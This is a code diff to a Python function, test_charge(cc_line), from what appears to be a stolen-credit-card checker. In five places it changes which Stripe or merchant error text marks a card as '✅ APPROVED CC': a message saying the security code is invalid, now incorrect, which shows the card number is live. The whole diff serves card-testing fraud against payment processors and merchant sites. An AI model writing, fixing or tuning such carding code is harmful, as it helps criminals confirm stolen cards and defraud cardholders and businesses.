@@ -302,7 +302,7 @@ def test_charge(cc_line):
             error_msg = extract_error_message(response_stripe)
             
             # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
-            if "Your card's security code is invalid." in error_msg or "security code is invalid" in error_msg.lower():
+            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                 return f"""
 ✅ APPROVED CC
 
@@ -356,7 +356,7 @@ def test_charge(cc_line):
             error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
             
             # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
-            if "Your card's security code is invalid." in error_msg or "security code is invalid" in error_msg.lower():
+            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                 return f"""
 ✅ APPROVED CC
 
@@ -496,7 +496,7 @@ def test_charge(cc_line):
                     response_text = response_ajax.text.lower()
                     
                     # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
-                    if "Your card's security code is invalid." in response_ajax.text or "security code is invalid" in response_text:
+                    if "Your card's security code is incorrect." in response_ajax.text or "security code is incorrect" in response_text:
                         return f"""
 ✅ APPROVED CC
 
@@ -564,7 +564,7 @@ def test_charge(cc_line):
                 response_text = response_ajax.text.lower()
                 
                 # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
-                if "Your card's security code is invalid." in response_ajax.text or "security code is invalid" in response_text:
+                if "Your card's security code is incorrect." in response_ajax.text or "security code is incorrect" in response_text:
                     return f"""
 ✅ APPROVED CC
 
@@ -631,7 +631,7 @@ def test_charge(cc_line):
             error_msg = extract_error_message(response_ajax)
             
             # CHECK FOR "Your card's security code is invalid." - APPROVED RESPONSE
-            if "Your card's security code is invalid." in error_msg or "security code is invalid" in error_msg.lower():
+            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
                 return f"""
 ✅ APPROVED CC
 
